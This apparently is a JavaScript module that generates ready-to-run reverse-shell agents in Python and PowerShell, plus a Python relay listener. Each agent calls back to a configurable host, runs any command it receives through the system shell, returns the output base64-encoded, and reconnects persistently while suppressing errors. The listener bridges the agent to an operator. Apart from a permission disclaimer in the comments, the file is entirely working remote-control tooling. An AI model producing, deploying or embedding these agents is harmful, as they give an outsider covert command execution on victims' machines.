const PYTHON_AGENT = [
  '#!/usr/bin/env python3',
  '# Reverse TCP Agent - Connects back to YOUR listener (host:port below).',
  '# USE ONLY on systems you own or have EXPLICIT permission for.',
  'import base64, socket, subprocess, time',
  'HOST="__HOST__"',
  'PORT=__PORT__',
  'TOKEN="__TOKEN__"',
  'DELAY=5',
  'TIMEOUT=60',
  'def send_line(s,t): s.sendall((t+"\\n").encode("utf-8","replace"))',
  'def loop(s):',
  '  r=s.makefile("r",encoding="utf-8",errors="replace")',
  '  send_line(s,"AUTH "+TOKEN)',
  '  h=r.readline()',
  '  if not h or not h.rstrip("\\r\\n").startswith("OK "): s.close(); return',
  '  while True:',
  '    ln=r.readline()',
  '    if not ln: break',
  '    ln=ln.rstrip("\\r\\n")',
  '    if not ln: continue',
  '    if ln=="QUIT": break',
  '    cmd=ln[4:] if ln.startswith("CMD ") else ln',
  '    try: o=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=TIMEOUT)',
  '    except subprocess.TimeoutExpired: o=type("",(),{"stdout":"timeout","stderr":""})()',
  '    except Exception as e: o=type("",(),{"stdout":"error: %s"%e,"stderr":""})()',
  '    send_line(s,"RES "+base64.b64encode((o.stdout+o.stderr).encode("utf-8","replace")).decode("ascii"))',
  '  s.close()',
  'def run():',
  '  while True:',
  '    try: loop(socket.create_connection((HOST,PORT),timeout=15))',
  '    except: pass',
  '    time.sleep(DELAY)',
  'if __name__=="__main__": run()',
].join('\n');

const POWERSHELL_AGENT = [
  '# Reverse TCP Agent - Connects back to YOUR listener (host:port below).',
  '# USE ONLY on systems you own or have EXPLICIT permission for.',
  '$script:AgentHost="__HOST__"',
  '$script:AgentPort=__PORT__',
  '$script:AgentToken="__TOKEN__"',
  'while($true){',
  '  try{',
  '    $c=[System.Net.Sockets.TcpClient]::new()',
  '    $c.Connect($AgentHost,$AgentPort)',
  '    $s=$c.GetStream()',
  '    $w=[System.IO.StreamWriter]::new($s); $w.AutoFlush=$true',
  '    $r=[System.IO.StreamReader]::new($s,[System.Text.Encoding]::UTF8)',
  '    $w.WriteLine("AUTH "+$AgentToken)',
  '    $ok=$r.ReadLine()',
  '    if($null -eq $ok -or -not $ok.StartsWith("OK ")){continue}',
  '    while($true){',
  '      $ln=$r.ReadLine()',
  '      if($null -eq $ln){break}',
  '      if($ln -eq "QUIT"){break}',
  '      $cmd=if($ln.StartsWith("CMD ")){$ln.Substring(4)}else{$ln}',
  '      try{',
  '        if($PSVersionTable.PSEdition -eq "Core" -and -not $IsWindows){$o=& /bin/sh -c $cmd 2>&1|Out-String}',
  '        else{$o=& cmd.exe /c $cmd 2>&1|Out-String}',
  '      }catch{$o="error: $_"}',
  '      $b=[System.Text.Encoding]::UTF8.GetBytes($o)',
  '      $w.WriteLine("RES "+[Convert]::ToBase64String($b))',
  '    }',
  '    $c.Close()',
  '  }catch{}',
  '  Start-Sleep -Seconds 5',
  '}',
].join('\n');

const PYTHON_LISTENER = [
  '#!/usr/bin/env python3',
  '# Relay Listener - run on YOUR OWN DEVICE.',
  '# Accepts Agent (AUTH) + any direction, bridges them.',
  '# USE ONLY on systems you own or have EXPLICIT permission for.',
  'import socket, threading',
  'PORT=__PORT__',
  'TOKEN="__TOKEN__"',
  'relay={"agent":None,"other":None}',
  'lock=threading.Lock()',
  'def sendln(s,t):',
  '  try: s.sendall((t+"\\n").encode("utf-8","replace"))',
  '  except: pass',
  'def read1(s):',
  '  b=b""',
  '  s.settimeout(30)',
  '  while len(b)<=512:',
  '    try: c=s.recv(1)',
  '    except: return ""',
  '    if not c: return ""',
  '    b+=c',
  '    if b.endswith(b"\\n"): break',
  '  return b.decode("utf-8","replace")',
  'def close_pair():',
  '  with lock: a,w=relay["agent"],relay["other"]; relay["agent"]=None; relay["other"]=None',
  '  for x in(a,w):',
  '    if x:',
  '      try: x.shutdown(socket.SHUT_RDWR)',
  '      except: pass',
  '      try: x.close()',
  '      except: pass',
  'def pump(src,dst):',
  '  try:',
  '    while True:',
  '      d=src.recv(4096)',
  '      if not d: break',
  '      dst.sendall(d)',
  '  except: pass',
  '  finally: close_pair()',
  'def bridge(a,w):',
  '  sendln(w,"AGENT ON")',
  '  threading.Thread(target=pump,args=(a,w),daemon=True).start()',
  '  threading.Thread(target=pump,args=(w,a),daemon=True).start()',
  'def consider():',
  '  with lock: a,w=relay["agent"],relay["other"]',
  '  if a and w: bridge(a,w)',
  'def classify(sock):',
  '  line=read1(sock).strip()',
  '  if line.startswith("AUTH "):',
  '    tok=line[5:].strip()',
  '    if tok!=TOKEN:',
  '      sendln(sock,"ERR bad-token"); sock.close(); return',
  '    with lock:',
  '      if relay["agent"]: sendln(sock,"ERR already-connected"); sock.close(); return',
  '      relay["agent"]=sock',
  '    sendln(sock,"OK relay")',
  '    consider()',
  '  elif line=="PULL":',
  '    with lock:',
  '      if relay["other"]: sock.close(); return',
  '      relay["other"]=sock',
  '    consider()',
  '  else: sock.close()',
  'def main():',
  '  srv=socket.socket(socket.AF_INET,socket.SOCK_STREAM)',
  '  srv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)',
  '  srv.bind(("0.0.0.0",PORT))',
  '  srv.listen(8)',
  '  print("relay ready on 0.0.0.0:%d"%PORT)',
  '  while True:',
  '    c,_=srv.accept()',
  '    threading.Thread(target=classify,args=(c,),daemon=True).start()',
  'if __name__=="__main__": main()',
].join('\n');

function safePort(p) {
  const n = Number(p);
  if (!Number.isInteger(n) || n <= 0 || n > 65535) throw new Error('port invalid');
  return n;
}

function safeToken(t) {
  if (!/^[0-9a-f]{8,64}$/.test(String(t))) throw new Error('token invalid');
  return String(t);
}

function safeHost(h) {
  const host = String(h || '').trim();
  if (!/^[a-zA-Z0-9.\-:\[\]]+$/.test(host)) throw new Error('host invalid');
  return host;
}

function fillAgent(template, host, port, token) {
  return template
    .replace('__HOST__', host)
    .replace('__PORT__', String(port))
    .replace('__TOKEN__', token);
}

function fillListener(template, port, token) {
  return template
    .replace('__PORT__', String(port))
    .replace('__TOKEN__', token);
}

export function generateAgent({ language, host, port, token }) {
  const h = safeHost(host);
  const p = safePort(port);
  const t = safeToken(token);
  const script = fillAgent(language === 'python' ? PYTHON_AGENT : POWERSHELL_AGENT, h, p, t);
  return { script, filename: language === 'python' ? 'agent.py' : 'agent.ps1' };
}

export function generateListener({ port, token }) {
  const p = safePort(port);
  const t = safeToken(token);
  const script = fillListener(PYTHON_LISTENER, p, t);
  return { script, filename: 'listener.py' };
}
